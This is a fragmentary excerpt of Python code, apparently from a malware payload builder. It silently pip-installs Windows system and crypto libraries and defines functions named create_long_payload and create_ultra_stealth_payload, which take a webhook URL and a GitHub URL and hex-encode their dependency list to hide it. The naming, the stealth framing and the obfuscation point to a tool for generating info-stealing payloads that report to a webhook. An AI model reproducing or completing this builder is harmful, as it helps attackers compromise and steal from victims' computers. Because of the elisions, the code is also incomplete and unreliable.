...
subprocess.run([__import__('sys').executable,'-m','pip','install','requests','pycryptodome','psutil','websocket-client','wmi','pywin32'])
...
def create_long_payload(webhook_url, github_url):
    ...
    libs = "72657175657374732c707963727970746f646f6d652c70737574696c2c776562736f636b65742d636c69656e742c776d692c707977696e3332"
...
def create_ultra_stealth_payload(webhook_url, github_url):
    ...
    #requests,pycryptodome,psutil,websocket-client,wmi,pywin32
    libs_hex = "72657175657374732c707963727970746f646f6d652c70737574696c2c776562736f636b65742d636c69656e742c776d692c707977696e3332"
